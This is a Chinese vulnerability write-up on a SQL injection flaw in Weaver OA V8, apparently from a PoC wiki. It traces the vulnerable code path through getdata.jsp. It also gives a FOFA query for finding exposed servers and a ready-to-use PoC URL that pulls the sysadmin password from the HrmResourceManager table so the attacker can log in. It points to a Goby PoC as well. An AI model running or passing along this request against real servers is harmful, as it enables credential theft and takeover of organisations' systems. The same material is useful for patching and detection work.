# 泛微OA-V8-SQL注入漏洞

## 漏洞描述

泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限

## 漏洞影响

> [!NOTE]
>
> 泛微OA V8

## FOFA

> [!NOTE]
>
> app="泛微-协同办公OA"

## 漏洞复现

在getdata.jsp中，直接将request对象交给

**weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : **

方法处理

![](泛微OA-V8-SQL注入漏洞.assets/1627363533797107.jpg)

在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法

![](泛微OA-V8-SQL注入漏洞.assets/1627363534028501.jpg)

Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)

在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中

![](泛微OA-V8-SQL注入漏洞.assets/1627363534518413.jpg)

根据以上代码流程，只要构造请求参数

?cmd= getSelectAllId&sql=select password as id from userinfo;

即可完成对数据库操控

POC

```
http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）

![](泛微OA-V8-SQL注入漏洞.assets/1627363534696039.jpg)

解密后即可登录系统

![](泛微OA-V8-SQL注入漏洞.assets/1627363534902542.jpg)

##  Goby & POC

> [!NOTE]
>
> 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
>
> Weaver OA 8 SQL injection

![](泛微OA-V8-SQL注入漏洞.assets/1627363535330666.jpg)

